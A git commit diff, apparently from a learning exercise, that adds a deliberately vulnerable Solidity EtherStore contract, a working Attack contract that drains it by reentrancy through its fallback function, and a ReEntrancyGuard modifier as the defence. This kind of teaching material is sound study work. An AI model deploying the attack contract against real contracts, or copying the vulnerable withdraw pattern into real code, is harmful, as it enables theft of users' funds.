6b6c92408b8766735883d1971dda632ae17e4ba8
laidOffWorkerLearnsToCode <kwg6qlyv@hotmail.com>
2023-11-21 16:38:38 +0800

    overflowNunderflow

--- contracts/ReEntrancy.sol
+++ contracts/ReEntrancy.sol
@@ -28,9 +28,60 @@ Here is how the function were called
 */
 
 contract EtherStore {
+    mapping(address => uint) public balances;
 
+    function deposit() public payable {
+        balances[msg.sender] += msg.value;
+    }
+
+    function withdraw() public {
+        uint bal = balances[msg.sender];
+        require(bal > 0, "Insufficient balance");
+
+        (bool sent, ) = msg.sender.call{value: bal}("");
+        require(sent, "Failed to send Ether");
+
+        balances[msg.sender] = 0;
+    }
+
+    function getBalance() public view returns (uint) {
+        return address(this).balance;
+    }
 }
 
 contract Attack {
+    EtherStore public etherStore;
+    uint256 public constant Amount = 1 ether;
 
+    constructor(address _etherStoreAddress) {
+        etherStore = EtherStore(_etherStoreAddress);
+    }
+
+    // Fallback is called when EtherStore sends Ether to this contract.
+    fallback() external payable {
+        if (address(etherStore).balance >= Amount) {
+            etherStore.withdraw();
+        }
+    }
+
+    function attack() external payable {
+        require(msg.value >= Amount);
+        etherStore.deposit{value: Amount}();
+        etherStore.withdraw();
+    }
+
+    function getBalance() public view returns (uint) {
+        return address(this).balance;
+    }
+}
+
+contract ReEntrancyGuard {
+    bool internal locked;
+
+    modifier noReentrant() {
+        require(!locked, "No re-entrancy");
+        locked = true;
+        _;
+        locked = false;
+    }
 }
